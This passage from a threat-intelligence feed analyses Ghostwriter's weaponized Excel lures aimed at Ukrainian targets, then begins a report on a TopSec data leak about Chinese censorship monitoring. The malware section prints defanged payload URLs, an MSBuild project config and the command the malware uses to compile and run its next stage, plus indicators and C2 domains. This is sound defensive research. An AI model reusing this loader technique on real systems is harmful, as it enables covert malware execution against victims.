<figure id="attachment_114847" aria-describedby="caption-attachment-114847" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_6.jpg" alt="Overview of the malware stages for Weaponized XLS 1" width="1999" height="1180" class="size-full wp-image-114847" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_6.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_6-300x177.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_6-1024x604.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_6-768x453.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_6-1536x907.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-114847" class="wp-caption-text">Overview of the malware stages for Weaponized XLS 1</figcaption></figure>
<p>During our analysis we only observed the benign JPG file being downloaded. However, based on the code analysis, we believe that the real targets receive an actual DLL. We assume that such a targeted payload delivery process is carefully controlled by the attackers and that they deliver the payload only after confirming the requesting client&#8217;s profile (browser user agent, IP address of the client, and matching time of the operation window). <a href="https://www.fortinet.com/blog/threat-research/menace-unleashed-excel-file-deploys-cobalt-strike-at-ukraine" target="_blank" rel="noopener noreferrer">Research</a> in a previous campaign found that a Cobalt Strike payload was delivered to targets only if the host IP was located in Ukraine.</p>
<p>Given the timing and targeting of the attack, we hypothesized that it may not have been an isolated incident. Further research led us to discover other samples closely resembling Weaponized XLS 1, suggesting that multiple attacks using the same techniques had been planned or executed. The samples used in these suspected attacks are described below.</p>
<h2>Weaponized XLS 2 | Ukraine Gov “Anti-Corruption Initiative”</h2>
<p>A file bearing the Ukrainian name <code>Zrazok.xls</code> (“Sample.xls”) is an XLS file (<code>301ffdf0c7b67e01fd2119c321e7ae09b7835afc</code>) with an obfuscated VBA macro embedded. However, the script code and obfuscation technique are different from the case we discussed earlier.</p>
<p>For this script, the attackers used a popular obfuscator tool called <a href="https://github.com/sevagas/macro_pack" target="_blank" rel="noopener noreferrer">Macropack</a>, an open-source but seemingly abandoned project originally developed for red-teaming and penetration testing exercises.</p>
<figure id="attachment_114845" aria-describedby="caption-attachment-114845" style="width: 1837px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_8.jpg" alt="Macropack-obfuscated VBA macro found inside the spreadsheet" width="1837" height="752" class="size-full wp-image-114845" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_8.jpg 1837w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_8-300x123.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_8-1024x419.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_8-768x314.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_8-1536x629.jpg 1536w" sizes="auto, (max-width: 1837px) 100vw, 1837px" /><figcaption id="caption-attachment-114845" class="wp-caption-text">Macropack-obfuscated VBA macro found inside the spreadsheet</figcaption></figure>
<p>As in the previous case, once the macro code is executed, the .NET ConfuserEx-obfuscated Downloader DLL (written to <code>%AppData%\Roaming\Microsoft\bruhdll32.dll</code>) is loaded with <code>rundll32.exe</code> and respective commandline arguments to run an exported function. After this, the new module drops a decoy XLS file and opens it with Excel.</p>
<figure id="attachment_114851" aria-describedby="caption-attachment-114851" style="width: 1790px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_2.jpg" alt="The decoy document prepared for a Ukrainian reader (an action plan for anti-corruption initiative in government organisations in Ukraine)" width="1790" height="1255" class="size-full wp-image-114851" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_2.jpg 1790w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_2-300x210.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_2-1024x718.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_2-768x538.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_2-1536x1077.jpg 1536w" sizes="auto, (max-width: 1790px) 100vw, 1790px" /><figcaption id="caption-attachment-114851" class="wp-caption-text">The decoy document prepared for a Ukrainian reader (an action plan for anti-corruption initiative in government organisations in Ukraine)</figcaption></figure>
<p>This module attempts to download the next stage from the following URL (unavailable at the time of writing):</p>
<pre>
https://sciencealert[.]shop/images/2024/11/black-hole-coronaxx.jpg
</pre>
<p>When the malware issues the HTTP request it uses a hardcoded User-Agent string that differs slightly from the previous case:</p>
<pre>
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
</pre>
<p>Notably, this file (<code>52e894acf0e14d27f8997d2174c1f40d6d87bba9</code>) was previously uploaded to <a href="https://www.virustotal.com/gui/file/4497bb70ca95b115d7be403141e34f7fb06070b8dd6ccf034d9a71c1c48826e4/details" target="_blank" rel="noopener noreferrer">VirusTotal</a> on December 19, 2024.</p>
<figure id="attachment_114846" aria-describedby="caption-attachment-114846" style="width: 1024px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_7.jpg" alt="Image file fetched from the malicious URL" width="1024" height="415" class="size-full wp-image-114846" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_7.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_7-300x122.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_7-768x311.jpg 768w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /><figcaption id="caption-attachment-114846" class="wp-caption-text">Image file fetched from the malicious URL</figcaption></figure>
<p>As with the previous case, the image file and its URL path appear to be copied from a public blog, published on Nov 16, 2024:</p>
<pre>
https://www.sciencealert.com/scientists-reveal-the-shape-of-a-black-holes-corona-for-the-very-first-time
</pre>
<p>Again, the file name and the path on the malicious server were nearly identical to the legitimate one, with the actor changing only the top level domain from <code>.com</code> to <code>.shop</code>.</p>
<pre>
https://www.sciencealert.com/images/2024/11/black-hole-coronaxx.jpg
</pre>
<p>In this case, the downloaded file is expected to be an archive in a GZIP format. Once downloaded, the malware decompresses it and saves it to the following location:</p>
<pre>
%APPDATA%\Roaming\Microsoft\SystemCertificates\CertificateCenter.dll
</pre>
<p>It also creates an additional text config file at:</p>
<pre>
%APPDATA%\Roaming\Microsoft\SystemCertificates\config
</pre>
<p>The config file contains the following data:</p>
<pre>
&lt;Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003"&gt;
 &lt;PropertyGroup&gt;
  &lt;AssemblyName&gt;Certificate&lt;/AssemblyName&gt;
  &lt;OutputPath&gt;Bin\&lt;/OutputPath&gt;
 &lt;/PropertyGroup&gt;
 &lt;ItemGroup&gt;
  &lt;Compile Include="CertificateCenter.dll" /&gt;
 &lt;/ItemGroup&gt;
 &lt;Target Name="Build"&gt;
  &lt;MakeDir Directories="$(OutputPath)" Condition="!Exists('$(OutputPath)')" /&gt;
  &lt;Csc Sources="@(Compile)" OutputAssembly="$(OutputPath)$(AssemblyName).exe" /&gt;
 &lt;/Target&gt;
&lt;/Project&gt;
</pre>
<p>The config file is used by the Downloader to execute <code>MSBuild.exe</code>, instructing it to build a new application:</p>
<pre>
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe %AppData%\Roaming\Microsoft\SystemCertificates\config
</pre>
<p>This suggests that the <code>CertificateCenter.dll</code> file is not a binary as the file extension would suggest but rather contains program source code. The command, if successful, produces an executable file in the following location:</p>
<pre>
%AppData%\Roaming\Microsoft\SystemCertificates\Bin\Certificate.exe
</pre>
<p>and likely contains the next stage of the infection chain.</p>
<figure id="attachment_114848" aria-describedby="caption-attachment-114848" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_5.jpg" alt="Overview of the malware stages for Weaponized XLS 2" width="1999" height="1621" class="size-full wp-image-114848" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_5.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_5-300x243.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_5-1024x830.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_5-768x623.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_5-1536x1246.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-114848" class="wp-caption-text">Overview of the malware stages for Weaponized XLS 2</figcaption></figure>
<h2>Weaponized XLS 3 | &#8220;Supplies for Ukraine Armed Forces&#8221;</h2>
<p>A file bearing the Ukrainian name <code>Донесення 5 реч - зразок.xls</code> (“Report 5 items &#8211; sample.xls”) is an XLS file (<code>9d110879d101bcaec7accc3001295a53dc33371f</code>) hosting another VBA payload obfuscated with Macropack.</p>
<p>As in the previous cases, once the macro code is executed, the .NET ConfuserEx-obfuscated Downloader DLL (written to <code>%AppData%\Roaming\Microsoft\bruhdll32.dll</code>) is loaded with <code>rundll32.exe</code> and respective commandline arguments to run an exported function. After this, the new module drops a decoy XLS file on disk and opens it with Excel.</p>
<figure id="attachment_114849" aria-describedby="caption-attachment-114849" style="width: 1989px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_4.jpg" alt="The decoy document prepared for a Ukrainian reader (a report template for the Ukrainian armed forces supplies)" width="1989" height="1256" class="size-full wp-image-114849" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_4.jpg 1989w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_4-300x189.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_4-1024x647.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_4-768x485.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_4-1536x970.jpg 1536w" sizes="auto, (max-width: 1989px) 100vw, 1989px" /><figcaption id="caption-attachment-114849" class="wp-caption-text">The decoy document prepared for a Ukrainian reader (a report template for the Ukrainian armed forces supplies)</figcaption></figure>
<p>Again, the malware uses the same payload retrieval technique and downloads a JPG file from yet another <code>.shop</code> domain:</p>
<pre>
https://cookingwithbooks[.]shop/images/qwerty.jpg
</pre>
<p>The URL is unavailable at the time of writing, but data from VirusTotal indicates that the downloaded file is identical to the black hole image described above in the Weaponized XLS 2 section. The malware logic is also identical with Weaponized XLS 2.</p>
<h2>Weaponized XLS 4 &amp; 5 | Variations on a Theme</h2>
<p>In addition to the previous findings, we discovered further related XLS files that were similarly weaponized. The files <code>Донесення 5 реч фонд зборів- зразок.xls</code> (“Report 5 items collection fund- sample.xls”; <code>2c06c01f9261fe80b627695a0ed746aa8f1f3744</code>) and <code>Додаток 8 реч новий.xls</code> (“Addition 8 items new &#8211; sample.xls”; <code>853da593d2a489c2bd72a284a362d7c68c3a4d4c</code>) were first uploaded from Ukraine in Feb 2025.</p>
<p>Both files contain a Macropack-obfuscated VBA macro; however, they differ in structure. Functionally, both drop a DLL to the previously noted path <code>%AppData%\Roaming\Microsoft\bruhdll32.dll</code>.</p>
<p>Again, the DLL is loaded with <code>rundll32.exe</code> and respective command line arguments to execute an exported function. Next, the victim sees a decoy workbook open in Excel.</p>
<p><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_12.jpg" alt="" width="1816" height="1138" class="aligncenter size-full wp-image-114853" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_12.jpg 1816w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_12-300x188.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_12-1024x642.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_12-768x481.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_12-1536x963.jpg 1536w" sizes="auto, (max-width: 1816px) 100vw, 1816px" /><br />
<figure id="attachment_114855" aria-describedby="caption-attachment-114855" style="width: 1868px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_10.jpg" alt="The decoy documents prepared for a Ukrainian reader (a report template for the Ukrainian armed forces supplies)" width="1868" height="1142" class="size-full wp-image-114855" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_10.jpg 1868w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_10-300x183.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_10-1024x626.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_10-768x470.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_10-1536x939.jpg 1536w" sizes="auto, (max-width: 1868px) 100vw, 1868px" /><figcaption id="caption-attachment-114855" class="wp-caption-text">The decoy documents prepared for a Ukrainian reader (a report template for the Ukrainian armed forces supplies)</figcaption></figure></p>
<p>The decoys are similar and the obfuscation technique, code structure, and the embedded URL are common to both:</p>
<pre>
https://pigglywigglystores[.]shop/wp-content/themes/fp-wp-j-piggly-wiggly-nc/resources/images/logo/logo.png
</pre>
<p>The User-Agent string in the HTTP request, however, is different, with the operating system and architectures specified as “Windows NT 10.0; Win64; x64”.</p>
<pre>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71
</pre>
<p>These variants of the malware also contain another embedded .NET DLL, internally referred to as LibCMD from the original filename <code>LibCMD.dll</code> (<code>4ae6b8adc980ba8a212b838f3ca6a9718d9a3757</code>). This is a small file, whose purpose is simply to start <code>cmd.exe</code> and connect to stdin/stdout.</p>
<p>The file contains a tampered PE link timestamp. It is never saved to disk; instead, it is loaded dynamically in memory as a .NET assembly and executed.</p>
<figure id="attachment_114844" aria-describedby="caption-attachment-114844" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_9.jpg" alt="Overview of the malware stages for Weaponized XLS 4 &amp; 5" width="1999" height="1621" class="size-full wp-image-114844" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_9.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_9-300x243.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_9-1024x830.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_9-768x623.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_9-1536x1246.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-114844" class="wp-caption-text">Overview of the malware stages for Weaponized XLS 4 &amp; 5</figcaption></figure>
<h2>Attribution</h2>
<p>Analysis of techniques used by threat actors can often be helpful in establishing the origin of the attack and the malware it uses. In this case, the obfuscation techniques are quite specific across all the samples we analyzed, allowing us to establish a medium confidence link between them and a malware cluster known as PicassoLoader, a downloader toolkit.</p>
<p>PicassoLoader has been used in cyber attacks targeting government, military, and civilian entities in Ukraine and Poland and is exclusively associated with the Ghostwriter threat actor (<i>aka</i> UNC1151, UAC-0057, Blue Dev 4, Moonscape, TA445).</p>
<p>Throughout 2024, Ghostwriter has repeatedly used a combination of Excel workbooks containing Macropack-obfuscated VBA macros and dropped embedded .NET downloaders obfuscated with ConfuserEx. In our case, the Downloader malware appears to be a simplified implementation of the PicassoLoader.</p>
<h2>Conclusion</h2>
<p>The Ghostwriter threat actor has been consistently active in the past years and continues its attempts to compromise targets aligned with the interests of Belarus and its closest ally, Russia. It has mounted multiple attacks reported by CERT UA and other security researchers throughout 2024.</p>
<p>While Belarus doesn’t actively participate in military campaigns in the war in Ukraine, cyber threat actors associated with it appear to have no reservation about conducting cyberespionage operations against Ukrainian targets.</p>
<p>The campaign described in this publication also serves as confirmation that Ghostwriter is closely tied with the interests of the Belarusian government waging an aggressive pursuit of its opposition and organizations associated with it.</p>
<div id="threattips"></div>
<p>We would like to express our thanks to partners in the region, including <a href="https://resident.ngo/" target="_blank" rel="noopener noreferrer">RESIDENT.NGO</a> and others who remain unnamed, for their invaluable collaboration. </p>
<p>Organizations that believe they may have been targeted by threat actors involved in this campaign are invited to reach out to the SentinelLABS team via <a href="mailto:ThreatTips@sentinelone.com" target="_blank" rel="noopener noreferrer">ThreatTips@sentinelone.com</a>.</p>
<h2>Indicators of Compromise</h2>
<div style="font-size:0.9em">
<b>Weaponized Excel Workbooks and Decoys</b></p>
<div style="overflow-x:auto;">
<table style="border-collapse: collapse; width: 100%; height: 120px;">
<tbody>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;"><strong>SHA-1</strong></td>
<td style="width: 35.0%; height: 24px;"><strong>File Name</strong></td>
</tr>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;">18151b3801bd716b5a33cfc85dbdc4ba84a00314</td>
<td style="width: 35.0%; height: 24px;">temp.xlsx</td>
</tr>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;">2c06c01f9261fe80b627695a0ed746aa8f1f3744</td>
<td style="width: 35.0%; height: 24px;">Донесення 5 реч фонд зборів- зразок.xls</td>
</tr>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;">301ffdf0c7b67e01fd2119c321e7ae09b7835afc</td>
<td style="width: 35.0%; height: 24px;">Zrazok.xls</td>
</tr>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;">853da593d2a489c2bd72a284a362d7c68c3a4d4c</td>
<td style="width: 35.0%; height: 24px;">Додаток 8 реч новий.xls</td>
</tr>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;">9d110879d101bcaec7accc3001295a53dc33371f</td>
<td style="width: 35.0%; height: 24px;">Донесення 5 реч &#8211; зразок.xls</td>
</tr>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;">ebb30fd99c2e6cbae392c337df5876759e53730d</td>
<td style="width: 35.0%; height: 24px;">политзаключенные (по судам минска).xls</td>
</tr>
</tbody>
</table>
</div>
<p><b>Downloaders</b><br />
18bcc91ad3eed529d44926f4ae65acf44480f39d<br />
64fca582cb69d9dc2afb1b432df58fb32ac18ca1<br />
7261ad5d4e760aa88df94b734bc44598a090852a<br />
9fa00a4ee4e95bc50a3919d2d3c0be2a567d8845<br />
e5ebc7deca1ff1f0a4b1462d37ef813dad8413a6</p>
<p><b>LibCMD helper file</b><br />
4ae6b8adc980ba8a212b838f3ca6a9718d9a3757</p>
<p><b>C2 Domains</b><br />
americandeliriumsociety[.]shop<br />
cookingwithbooks[.]shop<br />
everythingandthedog[.]shop<br />
pigglywigglystores[.]shop<br />
sciencealert[.]shop
</div>
]]></content:encoded>
					
		
		
		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter-ftr.jpg" length="411675" type="image/jpeg" />	</item>
		<item>
		<title>Censorship as a Service &#124; Leak Reveals Public-Private Collaboration to Monitor Chinese Cyberspace</title>
		<link>https://www.sentinelone.com/labs/censorship-as-a-service-leak-reveals-public-private-collaboration-to-monitor-chinese-cyberspace/</link>
		
		<dc:creator><![CDATA[Alex Delamotte, Aleksandar Milenkoski &amp; Dakota Cary]]></dc:creator>
		<pubDate>Fri, 21 Feb 2025 10:55:35 +0000</pubDate>
				<category><![CDATA[China]]></category>
		<guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&#038;p=114581</guid>

					<description><![CDATA[Data leak reveals how a top tier cybersecurity vendor helps the PRC enforce content monitoring and manipulation of public opinion in China.]]></description>
										<content:encoded><![CDATA[<h2>Executive Summary</h2>
<ul>
<li aria-level="1">SentinelLABS has analyzed a data leak containing infrastructure details and work logs from employees of a state-affiliated private sector security firm in China.</li>
<li aria-level="1">The leaked data contains references to web content monitoring services used to enforce censorship for public and private sector customers.</li>
<li aria-level="1">Work logs reveal that the firm provided bespoke monitoring services to a state-owned enterprise when a corruption scandal impacted this organization, providing insights into how the state and CCP coordinate with some cybersecurity companies to manage fallout from corruption scandals.</li>
</ul>
<h2>Overview</h2>
<p>SentinelLABS has analyzed a data leak from TopSec (北京天融), a Chinese cybersecurity firm offering services such as Endpoint Detection &amp; Response (EDR) and vulnerability scanning, while offering boutique solutions to align with government initiatives and intelligence requirements.</p>
<p>The data leak includes a document with 7,000+ lines of work logs and code used to orchestrate infrastructure for the firm’s DevOps practices and downstream customers and includes scripts that connect to several Chinese government hostnames, academic institutions and news sites.</p>
<p>We identified work logs and system features that indicate TopSec is likely enabling content moderation for internet censorship purposes, a key <a href="https://www.atlanticcouncil.org/in-depth-research-reports/report/community-watch-chinas-vision-for-the-future-of-the-internet/">strategy</a> used by the Chinese Communist Party (CCP) to monitor and control public opinion on issues that the state deems contentious or antisocial.</p>
<p>Further, we found evidence indicating that TopSec provided bespoke services to a state-owned enterprise on the date that a corruption investigation was announced targeting the organization’s top official.</p>
<p>The Chinese cybersecurity market has long been a mystery for many researchers in the west. Unlike Europe and parts of the Middle East, which foster some degree of collaboration, the Chinese cybersecurity market is obscured behind the wall that divides China from the global internet. This finding reveals not only the types of technologies that are used by a prestigious Chinese tech firm, but how they are providing security services to private and public sector customers inside China.</p>
<h2>TopSec</h2>
<p>TopSec is a provider of monitoring and IT security solutions, as well as big data and cloud services. Established in 1995, TopSec prides itself on its long history and prioritizes national cyberspace security as a core element of its mission statement.</p>
<p>Company registration details reveal that TopSec holds over 1,000 patents, 87 software copyrights, and has 12 subsidiaries. The company is also a <a href="https://www.atlanticcouncil.org/in-depth-research-reports/report/sleight-of-hand-how-china-weaponizes-software-vulnerability/">Tier 1 vulnerability supplier</a> to China’s civilian intelligence ministry. According to TopSec&#8217;s 2024 annual corporate report for shareholders, the company has been offering cloud monitoring services–including IT security monitoring capabilities–since 2004. By 2020, these TopSec services were in use across all 31 of China’s administrative regions.</p>
<p><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_7.jpg" alt="Description of TopSec services" width="1999" height="128" class="aligncenter size-full wp-image-114588" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_7.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_7-300x19.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_7-1024x66.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_7-768x49.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_7-1536x98.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><br />
<figure id="attachment_114604" aria-describedby="caption-attachment-114604" style="width: 696px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Screenshot-2025-02-20-at-14.27.08.jpg" alt="Description of TopSec services" width="696" height="130" class="size-full wp-image-114604" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/Screenshot-2025-02-20-at-14.27.08.jpg 696w, https://www.sentinelone.com/wp-content/uploads/2025/02/Screenshot-2025-02-20-at-14.27.08-300x56.jpg 300w" sizes="auto, (max-width: 696px) 100vw, 696px" /><figcaption id="caption-attachment-114604" class="wp-caption-text">Description of TopSec services</figcaption></figure></p>
<p><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_4.jpg" alt="" width="1999" height="683" class="aligncenter size-full wp-image-114591" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_4.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_4-300x103.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_4-1024x350.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_4-768x262.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_4-1536x525.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><br />
<figure id="attachment_114600" aria-describedby="caption-attachment-114600" style="width: 782px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_12.jpg" alt="TopSec&#039;s 2024 annual corporate report" width="782" height="266" class="size-full wp-image-114600" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_12.jpg 782w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_12-300x102.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_12-768x261.jpg 768w" sizes="auto, (max-width: 782px) 100vw, 782px" /><figcaption id="caption-attachment-114600" class="wp-caption-text">TopSec&#8217;s 2024 annual corporate report (<a href="https://file.finance.sina.com.cn/211.154.219.97:9494/MRGG/CNSESZ_STOCK/2024/2024-4/2024-04-20/10013439.PDF" target="_blank">Source</a>)</figcaption></figure></p>
<p>The leaked documents we analyzed reference multiple organizations in both the private and public sectors, likely customers or otherwise associated with TopSec, a selection of which is listed below. These references include probable deployment sites of monitoring probes and mentions in-work progress records.</p>
<p>Public sector organizations referenced in the documents include entities integral to China’s political system, such as the Municipal Commissions for Discipline Inspection, which enforce party regulations and investigate corruption. Another example is the Illegal and Harmful Information Reporting Center, an entity dedicated to combating what the Chinese Communist Party (CCP) considers illegal and harmful behavior in the online space. TopSec customers referenced in these documents include:</p>
<ul>
<li>Dongwu Fund Management Co., Ltd</li>
<li>Gucheng County Petition Bureau</li>
<li>Illegal and Harmful Information Reporting Center</li>
<li>Linhai Rural Commercial Bank</li>
<li>Petkit</li>
<li>Shanghai Diepai Automobile Technology Co</li>
<li>Shanghai Fengyilong Electronic</li>
<li>Shanghai Medical Packaging Materials Factory</li>
<li>Shanghai Municipal Commission for Discipline Inspection</li>
<li>Shanghai Municipal Supervisory Commission</li>
<li>Tibet Autonomous Region</li>
<li>Tibet Autonomous Region Committee of the Communist Party of China</li>
<li>Wuhu Discipline Inspection and Supervision Network</li>
</ul>
<p>We observed references to three projects associated with Bureaus of the Ministry of Public Security in the northeastern city of Dandong, as well as the Songjiang and Pudong districts of Shanghai, with the latter project referred to as the &#8220;Cloud Monitoring Service Project&#8221;. The Ministry of Public Security is responsible for maintaining public order and overseeing law enforcement and surveillance activities to ensure compliance with national regulations.</p>
<pre>
[2024-2025 Shanghai Public Security Bureau Pudong Branch Cloud Monitoring Service Project (Phase II)]
The statistics of events that occurred today are as follows:
Aggregated events: 883 Valid: 129 Invalid: 672 On-hand: 82
Single events: 5637 Valid: 187 Invalid: 2781 On-hand: 2669
In terms of event volume, it is basically the same as that of our competitors.
</pre>
<p>A public procurement announcement for the &#8220;Cloud Monitoring Service Project&#8221; suggests that it involves monitoring the security posture and content of websites under the Bureaus&#8217; jurisdiction, with alerts issued in case of security breaches or policy violations. TopSec was likely involved in the bidding process alongside competitor companies. Public documents, however, show TopSec did not win the contract.</p>
<figure id="attachment_114586" aria-describedby="caption-attachment-114586" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_9.jpg" alt="Contract Announcement of Shanghai Public Security Bureau Pudong Branch Cloud Monitoring Service Project" width="1999" height="980" class="size-full wp-image-114586" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_9.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_9-300x147.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_9-1024x502.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_9-768x377.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_9-1536x753.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-114586" class="wp-caption-text">Contract announcement  for Cloud Monitoring Service Project (<a href="https://www.zfcg.sh.gov.cn/luban/detail?parentId=137027&amp;articleId=yuZoUGZxSiBaeduhBehxXA==" target="_blank">Source</a>)</figcaption></figure>
<figure id="attachment_114587" aria-describedby="caption-attachment-114587" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_8.jpg" alt="Procurement announcement for Cloud Monitoring Service Project" width="1999" height="1174" class="size-full wp-image-114587" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_8.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_8-300x176.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_8-1024x601.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_8-768x451.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/topsec_8-1536x902.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-114587" class="wp-caption-text">Procurement announcement for Cloud Monitoring Service Project (<a href="https://www.shexgrp.com/jyzx/001001/001001004/001001004001/20240729/7979111.html" target="_blank">Source</a>)</figcaption></figure>
<h2>Infrastructure Features</h2>
